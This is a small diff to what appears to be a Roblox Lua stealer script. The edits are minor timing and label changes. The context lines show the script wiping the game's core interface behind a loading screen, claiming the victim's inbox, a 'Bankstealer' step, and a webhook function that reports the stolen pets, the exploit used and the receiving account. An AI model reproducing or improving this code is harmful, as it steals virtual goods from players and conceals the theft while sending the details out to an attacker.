@@ -184,7 +184,6 @@ local data1
 for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
     v:Destroy()
 end
-
 -- Loading Screen
 if _G.LoadingScreen ~= false then
     local ScreenGui = Instance.new("ScreenGui")
@@ -760,7 +759,7 @@ local inbox = #check.Inbox
 
 if inbox ~= 0 and invspace_nolimit() >= inbox then
     claimallremote:InvokeServer()
-    task.wait(1)
+    task.wait(0)
 end
 
 -- Run Bankstealer if Diamonds Are < 110k
@@ -1047,7 +1046,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":frog: **Pets left** :frog:",
+                    ["name"] = ":frog: **Pets Amount** :frog:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1117,7 +1116,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":frog: **Pets left** :frog:",
+                    ["name"] = ":frog: **Pets Amount** :frog:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1962,6 +1961,6 @@ spawn(function()
         WMythicList = {}
         WMList = {}
         WMcc = {}
-        wait(0)
+        wait()
     end
 end)
